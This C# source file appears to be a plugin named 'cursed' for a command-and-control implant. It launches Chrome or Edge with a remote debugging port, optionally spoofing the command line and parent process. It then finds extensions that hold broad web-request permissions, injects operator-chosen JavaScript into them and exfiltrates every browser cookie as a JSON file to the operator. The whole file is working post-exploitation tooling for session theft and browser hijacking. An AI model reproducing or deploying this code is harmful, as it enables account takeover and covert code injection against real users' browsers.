using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using Agent.Utilities;
using System.Reflection;
using cursed.Finders;

namespace Agent
{
    public partial class Plugin : IInteractivePlugin, IFilePlugin
    {
        public string Name => "cursed";
        private IMessageManager messageManager { get; set; }
        private ISpawner spawner { get; set; }
        private readonly List<string> main_permissions = new List<string> { "<all_urls>", "webRequest", "webRequestBlocking" };
        private readonly List<string> alt_permissions = new List<string> { "http://*/*", "https://*/*", "webRequest", "webRequestBlocking" };
        private Dictionary<string, string> cookiesOut = new Dictionary<string, string>();
        private CursedConfig config { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.config = new CursedConfig();
            this.messageManager = messageManager;
            this.spawner = spawner;
        }
        public async Task Execute(ServerJob job)
        {
            CursedArgs args = JsonSerializer.Deserialize<CursedArgs>(job.task.parameters);

            if (args.debug_port > 0)
            {
                this.config.debug_port = args.debug_port.ToString();
            }

            if (args.parent > 0)
            {
                this.config.parent = args.parent;
            }

            if (!string.IsNullOrEmpty(args.payload))
            {
                this.config.payload = args.payload;
            }

            if (string.IsNullOrEmpty(args.target))
            {
                this.config.target = args.target;
            }
        }
        public async Task HandleNextMessage(ServerTaskingResponse response)
        {
            if (!this.cookiesOut.ContainsKey(response.task_id))
            {
                return;
            }

            DownloadTaskResponse dr = new DownloadTaskResponse()
            {
                task_id = response.task_id,
                download = new DownloadTaskResponseData
                {
                    total_chunks = 1,
                    is_screenshot = false,
                    filename = $"{Environment.MachineName}-cookies.json",
                    host = "",
                    chunk_num = 1,
                    chunk_data = Misc.Base64Encode(this.cookiesOut[response.task_id]),
                    file_id = response.file_id,
                },
            };

            await this.messageManager.AddResponse(dr.ToJson());

            this.cookiesOut.Remove(response.task_id);
        }
        public async void Interact(InteractMessage message)
        {
            string user_input = Misc.Base64Decode(message.data).TrimEnd(Environment.NewLine.ToCharArray());
            var inputParts = Misc.SplitCommandLine(user_input);
            switch (inputParts[0])
            {
                case "cursed":
                    this.Cursed(this.config.payload, message.task_id);
                    break;
                case "cookies":
                    this.TryGetCookies(message.task_id);
                    break;
                case "get":
                    if (inputParts.Length < 2)
                        this.GetValue("", message.task_id);
                    else
                        this.GetValue(inputParts[1], message.task_id);
                    break;
                case "set":
                    string value = String.Empty;
                    if (inputParts.Length > 3)
                        value = string.Join(" ", inputParts, 2, inputParts.Length - 2);
                    else
                        value = inputParts[2].TrimStart('"').TrimEnd('"');

                    //string args = string.Join(" ", inputParts, 2, inputParts.Length -1);
                    this.SetConfig(inputParts[1], value, message.task_id);
                    break;
                case "extensions":
                    var extensions = GetExtensions(this.config, message.task_id);
                    ReturnOutput(JsonSerializer.Serialize(extensions), message.task_id);
                    break;
                case "inject-js":
                    if (inputParts.Count() < 3)
                    {
                        ReturnOutput("Please specify both an ID and a payload", message.task_id);
                        break;
                    }

                    var res = InjectJs(inputParts[1], inputParts[2], config, message.task_id);
                    break;
                case "spawn":

                    if (inputParts.Length < 2)
                    {
                        ReturnOutput("Please specify a browser.", message.task_id);
                        break;
                    }

                    if (!Spawn(inputParts[1], user_input, message.task_id))
                    {
                        ReturnOutput($"Failed to spawn {inputParts[1]}", message.task_id);
                        break;
                    }
                    ReturnOutput($"{inputParts[1]} spawned and listening on port {this.config.debug_port}", message.task_id);
                    break;
                case "exit":
                    this.config = new CursedConfig();
                    await this.messageManager.AddResponse(new InteractMessage()
                    {
                        task_id = message.task_id,
                        data = Misc.Base64Encode("Exited."),
                        message_type = InteractiveMessageType.Exit,
                    });
                    break;
                case "help":
                    await this.messageManager.AddResponse(new InteractMessage()
                    {
                        task_id = message.task_id,
                        data = Misc.Base64Encode(CommandParser.GetHelpText() + Environment.NewLine),
                        message_type = InteractiveMessageType.Output,
                    });
                    break;
            }
        }
        private void Cursed(string payload, string task_id)
        {
            //Parse for chosen browser
            ReturnOutput("[+] Getting extensions", task_id);
            var extensions = GetExtensions(this.config, task_id);

            if (extensions.Count <= 0)
            {
                //No extensions installed
                ReturnOutput("[!] No extensions found", task_id);
                return;
            }

            ReturnOutput($"[+] Got {extensions.Count} extensions, enumerating for potential injection candidates.", task_id);

            List<ChromeJsonObject> extensionCandidates = new List<ChromeJsonObject>();

            foreach (var extension in extensions)
            {
                var manifest = GetManifestFromExtension(extension, task_id);
                if (manifest is null)
                {
                    continue;
                }

                var permissions = GetPermissionsFromManifest(manifest);

                if (permissions.Count == 0)
                {
                    continue;
                }

                if (Misc.CheckListValues(permissions, main_permissions) || Misc.CheckListValues(alt_permissions, permissions))
                {
                    extensionCandidates.Add(extension);
                }
            }

            if (extensionCandidates.Count <= 0)
            {
                ReturnOutput("[!] Didn't find any good extension candidates.", task_id);
                return;
            }

            ReturnOutput($"[+] Found {extensionCandidates.Count} candidates!", task_id);

            if (string.IsNullOrEmpty(payload))
            {
                if (string.IsNullOrEmpty(this.config.target))
                {
                    ReturnOutput("[!] No target specified, and no payload set! Please set one of the options.", task_id);
                    return;
                }
                payload = this.config.GetDefaultPayload();
            }

            ReturnOutput("[+] Injecting our payload", task_id);
            foreach (var extension in extensionCandidates)
            {
                if (TryInjectJs(extension, payload, task_id, out var response))
                {
                    ReturnOutput("[+] Succesfully injected payload.", task_id);

                    if (this.config.debug)
                    {
                        ReturnOutput(response, task_id);
                    }
                    return;
                }

                ReturnOutput("[!] Failed to inject payload.", task_id);
                
                if (this.config.debug)
                {
                    ReturnOutput(response, task_id);
                }
            }
        }
        private bool TryGetCookies(string task_id)
        {
            List<ChromeJsonObject> extensions = GetEverything(this.config, task_id);

            if (extensions.Count == 0)
            {
                return false;
            }

            string response = InjectGetAllCookies(extensions.First(), task_id);

            if (this.config.debug)
            {
                ReturnOutput(response, task_id);
            }

            if (string.IsNullOrEmpty(response))
            {
                ReturnOutput("[!] Failed to inject JS for cookies request", task_id);
                return false;
            }

            JsonDocument responseJsonDocument = JsonDocument.Parse(response);
            JsonElement responseRoot = responseJsonDocument.RootElement;

            //Todo remove cookies element, and maybe remove samesite values?
            if (responseRoot.TryGetProperty("result", out JsonElement resultElement))
            {
                //Strip outer edge, leaving only the good inside
                ReturnOutput("[+] Returning parsed cookies file", task_id);
                this.cookiesOut.Add(task_id, resultElement.GetRawText());
                StartSendFile(task_id);
                return true;
            }

            //Something fucked up, so just return the raw response
            ReturnOutput("[!] Failed to parse cookies, returning raw output", task_id);
            this.cookiesOut.Add(task_id, response);
            StartSendFile(task_id);
            return false;
        }
        private bool Spawn(string choice, string full_cmdline, string task_id)
        {
            string commandline = string.Empty;

            IFinder finder;
            switch (choice.ToLower())
            {
                case "chrome":
                    finder = new ChromeFinder();
                    break;
                case "edge":
                    finder = new EdgeFinder();
                    break;
                default:
                    finder = new ManualFinder(full_cmdline);
                    break;
            }

            string spoofedcmdline = string.Empty;

            if (!string.IsNullOrEmpty(this.config.spoofed_cmdline))
            {
                spoofedcmdline = $"{finder.FindPath()} {this.config.cmdline}";
            }

            if (!string.IsNullOrEmpty(this.config.cmdline))
            {
                commandline = this.config.cmdline;
            }
            else
            {
                string location = finder.FindPath();

                if (string.IsNullOrEmpty(location))
                {
                    ReturnOutput("[!] Failed to find executable locatino.", task_id);
                    return false;
                }
                commandline = $"{location} --remote-debugging-port={this.config.debug_port}";
            }


            SpawnOptions opts = new SpawnOptions()
            {
                task_id = task_id,
                commandline = commandline,
                spoofedcommandline = spoofedcmdline,
                output = false,
                parent = this.config.parent
            };

            return spawner.Spawn(opts).Result;
        }
        private void SetConfig(string choice, string value, string task_id)
        {
            Type type = config.GetType();
            PropertyInfo property = type.GetProperty(choice);

            switch (choice)
            {
                case null:
                    ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
                    return;
                case "parent":
                    if(int.TryParse(value, out var num))
                    {
                        property.SetValue(config, num);
                        ReturnOutput("Set " + choice + " to " + value, task_id);
                        return;
                    }
                    break;
                case "debug":
                    if(bool.TryParse(value, out var flag))
                    {
                        property.SetValue(config, flag);
                        ReturnOutput("Set " + choice + " to " + value, task_id);
                        return;
                    }
                    break;
                default:
                    try
                    {
                        if(property is not null)
                        {
                            property.SetValue(config, value);
                            ReturnOutput("Set " + choice + " to " + value, task_id);
                            return;
                        }

                    }
                    catch
                    {

                    }
                    break;
            }

            ReturnOutput("Invalid value for parameter", task_id);
        }
        private void GetValue(string choice, string task_id)
        {
            switch (choice.ToLower())
            {
                case "":
                case null:
                    foreach (var prop in config.GetType().GetProperties())
                    {
                        if (prop.GetValue(config) is null)
                        {
                            ReturnOutput($"{prop.Name}: <empty>", "");
                        }
                        else
                        {
                            ReturnOutput($"{prop.Name}: {prop.GetValue(config)}", task_id);
                        }
                    }
                    break;
                default:
                    Type type = config.GetType();                    
                    try
                    {
                        var property = type.GetProperty(choice);
                        if(property is null)
                        {
                            ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
                            return;
                        }

                        var propVal = property.GetValue(config);

                        if(propVal is null)
                        {
                            ReturnOutput($"{choice}: <empty>", task_id);
                            return;
                        }

                        ReturnOutput($"{choice}: {propVal}", task_id);
                    }
                    catch
                    {
                        ReturnOutput($"Property '{choice}' not found on type '{type.Name}'.", task_id);
                    }
                break;

            }
        } 
        private void StartSendFile(string task_id)
        {
            messageManager.AddResponse(new DownloadTaskResponse
            {
                download = new DownloadTaskResponseData()
                {
                    total_chunks = 1,
                    filename = $"{Environment.MachineName}-cookies.json",
                    chunk_num = 0,
                    chunk_data = string.Empty,
                    is_screenshot = false,
                },
                task_id = task_id,
            }.ToJson());
        }
        private void ReturnOutput(string message, string task_id)
        {
            this.messageManager.AddResponse(new InteractMessage()
            {
                task_id = task_id,
                data = Misc.Base64Encode(message + Environment.NewLine),
                message_type = InteractiveMessageType.Output,
            });
        }
    }
}
